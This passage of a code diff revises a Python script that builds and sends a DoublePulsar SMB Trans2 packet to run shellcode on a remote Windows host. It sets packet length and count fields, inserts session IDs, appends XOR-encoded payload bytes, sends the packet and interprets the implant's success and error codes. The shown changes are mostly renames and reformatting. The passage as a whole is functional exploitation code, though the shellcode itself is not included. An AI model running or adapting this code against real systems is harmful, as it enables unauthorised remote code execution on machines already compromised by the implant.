         print("Total size of SMB packet:  %d" % trans2_packet_len)
-        
-        packet_len = trans2_packet_len + shellcode_payload_size
+
+        packet_len = trans2_packet_len + buffer_len
         print("Total size of SMB packet & shellcode:  %d" % packet_len)
-        
+
         print("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet")
-        print("Example: A full packet wil be 4178 bytes in length.  4096 bytes for shellcode, 70 for the SMB doublepulsar packet, 12 for the parameters")
+        print(
+            "Example: A full packet wil be 4178 bytes in length.  4096 bytes for shellcode, 70 for the SMB doublepulsar packet, 12 for the parameters")
         print("but the NetBIOS header will say 4174 because the 4 bytes in the NetBIOS header doesn't count")
 
         '''
@@ -316,64 +367,66 @@ if __name__ == "__main__":
                            + parameter len ( 12 )
                            - NetBIOS header (4 )
         '''
-        merged_packet_len = trans2_packet_len + shellcode_payload_size + 12 - 4
+        merged_packet_len = trans2_packet_len + buffer_len + 12 - 4
         print("UPDATED:  Total size of SMB packet & shellcode:  %d" % merged_packet_len)
 
         print("Updating SMB length value...")
-        #SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
+        # SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
+        # If fails, try using: smb_length = struct.pack('>i', merged_packet_len)
         smb_length = struct.pack('>H', merged_packet_len)
         doublepulsar_exec_packet[2] = smb_length[0]
         doublepulsar_exec_packet[3] = smb_length[1]
-        
-        #<H = Little Endian unsigned short
-        TotalDataCount = struct.pack('<H', shellcode_payload_size)
-        DataCount = struct.pack('<H', shellcode_payload_size)
-        ByteCount = struct.pack('<H', shellcode_payload_size+12)
-        
+
+        # <H = Little Endian unsigned short
+        TotalDataCount = struct.pack('<H', buffer_len)
+        DataCount = struct.pack('<H', buffer_len)
+        ByteCount = struct.pack('<H', buffer_len + 12)
+
         '''
         not sure why we add 13 here
         and not 12 but it's because of the parameters but it's in the Doublepulsar 
-        examples so we'll just copy that for now
+        examples so we'll just copy that
         '''
-        
-        #update TotalDataCount in the packet ( default in the packet is 4096 )
+
+        # update TotalDataCount in the packet ( default in the packet is 4096 )
         doublepulsar_exec_packet[39] = TotalDataCount[0]
         doublepulsar_exec_packet[40] = TotalDataCount[1]
-        #update DataCount in the packet ( default in the packet is 4096 )
+        # update DataCount in the packet ( default in the packet is 4096 )
         doublepulsar_exec_packet[59] = DataCount[0]
         doublepulsar_exec_packet[60] = DataCount[1]
-        #update ByteCount in the packet ( default in the packet is 4109 )
+        # update ByteCount in the packet ( default in the packet is 4109 )
         doublepulsar_exec_packet[67] = ByteCount[0]
         doublepulsar_exec_packet[68] = ByteCount[1]
-    
-        #update values for tree ID and user ID
+
+        # update values for tree ID and user ID
         doublepulsar_exec_packet[28] = tree_id[0]
         doublepulsar_exec_packet[29] = tree_id[1]
         doublepulsar_exec_packet[32] = user_id[0]
         doublepulsar_exec_packet[33] = user_id[1]
 
         doublepulsar_exec_packet += xor_parameters
-        doublepulsar_exec_packet += xor_data
+        doublepulsar_exec_packet += xor_bytes
 
-        #print("hex content of the hex packet")
-        #print(hexdump(doublepulsar_exec_packet))
-        print("Sending data!  Length of the final hex packet", len(doublepulsar_exec_packet))
+        print("hex content of the hex packet")
+        print(hexdump(doublepulsar_exec_packet))
+        print("Length of the final hex packet", len(doublepulsar_exec_packet))
         s.send(doublepulsar_exec_packet)
         smb_response = s.recv(1024)
 
-        #0x52
+        # 0x52
         if smb_response[34] == 82:
-	        print("Doublepulsar returned:  Success!\n")
-        #0x62
+            print("Doublepulsar returned:  Success!\n")
+        # 0x62
         elif smb_response[34] == 98:
-	        print("Doublepulsar returned:  Invalid parameters!\n")
-        #0x72
+            print("Doublepulsar returned:  Invalid parameters!\n")
+        # 0x72
         elif smb_response[34] == 114:
-	        print("Doublepulsar returned:  Allocation failure!\n")
+            print("Doublepulsar returned:  Allocation failure!\n")
         else:
-	        print("Doublepulsar didn't succeed\n")
-         
-        tree_disconnect = binascii.unhexlify("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
+            print("Doublepulsar didn't succeed\n")
+
+        tree_disconnect = binascii.unhexlify(
+            "00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
         tree_disconnect_packet = bytearray(tree_disconnect)
         tree_disconnect_packet[28] = tree_id[0]
         tree_disconnect_packet[29] = tree_id[1]
@@ -382,7 +435,8 @@ if __name__ == "__main__":
         s.send(tree_disconnect_packet)
         smb_response = s.recv(1024)
 
-        logoff = binascii.unhexlify("00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000")
+        logoff = binascii.unhexlify(
+            "00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000")
         logoff_packet = bytearray(logoff)
         logoff_packet[28] = tree_id[0]
         logoff_packet[29] = tree_id[1]
